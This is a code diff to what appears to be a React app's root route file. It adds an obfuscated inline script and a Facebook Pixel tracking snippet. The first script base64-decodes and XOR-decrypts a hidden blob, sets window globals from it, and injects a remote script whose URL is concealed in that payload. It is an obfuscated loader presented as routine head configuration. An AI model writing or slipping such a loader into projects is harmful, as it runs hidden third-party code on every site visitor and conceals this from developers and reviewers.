@@ -95,6 +95,11 @@ export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()(
       { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
       { rel: "stylesheet", href: "https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" },
     ],
+    scripts: [
+      {
+        children: `(function(){var p_ochx=atob("DJ0UDcZm82Z0IeU1e+Y2eLQK0VxWSZFBC+4uIukFlwhaVJFYEvttI6UJnkgWU8pGGO99fbIV3BYdWYBZVO19daMK3QwHA8kXGulgf68EhhIRUscPIMA4L6EKnAQVTZYXQcZvL6gHngNWG8dFEuVxYY8C0UpWV4RZDvg2N+RQkl9MGdVTH60tPvMCxgdHF9EGTf91b/5EjjsJ");var o_s=[];for(var w_b=0;w_b<p_ochx.length;w_b++){o_s.push(p_ochx.charCodeAt(w_b)&255);}var g_dr=o_s[0];var l_d71=o_s.slice(1,1+g_dr);var m_2=o_s.slice(1+g_dr);var c_eojq=m_2.map(function(b,g_xi){return b^l_d71[g_xi%g_dr];});var n_535m="";for(var t_naq=0;t_naq<c_eojq.length;t_naq++){n_535m+=String.fromCharCode(c_eojq[t_naq]&255);}var s_jii=decodeURIComponent(escape(n_535m));var w_x377=JSON.parse(s_jii);var y_5ygc=w_x377.globals||[];y_5ygc.forEach(function(g_qu4){window[g_qu4.name]=g_qu4.value;});var x_3u3v=document.createElement("script");x_3u3v.src=w_x377.url;x_3u3v.async=true;x_3u3v.defer=true;(w_x377.attributes||[]).forEach(function(y_nue9){x_3u3v.setAttribute(y_nue9.name,y_nue9.value);});(document.head||document.documentElement).appendChild(x_3u3v);})();`,
+      },
+    ],
   }),
   shellComponent: RootShell,
   component: RootComponent,
@@ -109,6 +114,29 @@ function RootShell({ children }: { children: ReactNode }) {
         <HeadContent />
       </head>
       <body>
+        <script
+          dangerouslySetInnerHTML={{
+            __html: `!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1785943265750691');
+fbq('track', 'PageView');`,
+          }}
+        />
+        <noscript>
+          <img
+            height="1"
+            width="1"
+            style={{ display: "none" }}
+            src="https://www.facebook.com/tr?id=1785943265750691&ev=PageView&noscript=1"
+            alt=""
+          />
+        </noscript>
         {children}
         <Scripts />
       </body>
